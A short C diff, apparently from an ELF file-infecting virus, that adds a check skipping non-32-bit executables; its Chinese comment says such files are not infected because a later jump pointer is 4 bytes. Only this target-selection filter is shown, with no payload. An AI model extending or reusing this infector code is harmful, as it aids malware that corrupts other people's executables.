@@ -144,7 +144,12 @@ do_main()
     {
     	   close (fd);
    	   continue;
-    }
+    }//非32位的不感染， 因为后面的跳转指针是4字节的
+	else if (e_hdr->e_ident[EI_CLASS] != ELFCLASS32)
+	{
+		close (fd);
+		continue;
+	}
     else 
     {
     	p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);
